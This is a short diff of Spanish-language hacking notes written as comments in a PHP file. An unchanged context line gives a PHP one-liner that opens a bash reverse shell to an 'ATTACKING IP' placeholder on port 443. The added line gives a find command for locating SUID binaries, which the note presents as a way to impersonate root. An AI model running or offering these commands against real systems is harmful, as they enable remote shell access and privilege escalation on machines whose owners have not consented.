@@ -6,6 +6,8 @@
 
 // Un comando Oneliner para ganar reverse shell efectivo es: <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?> 
 
+// Para buscar archivos con privilegios SUID los cuales permiten impersonar al root puedo usar el comando: find / -perm -4000 2>/dev/null 
+
 -------------------------------------------------------------
 <?php
 
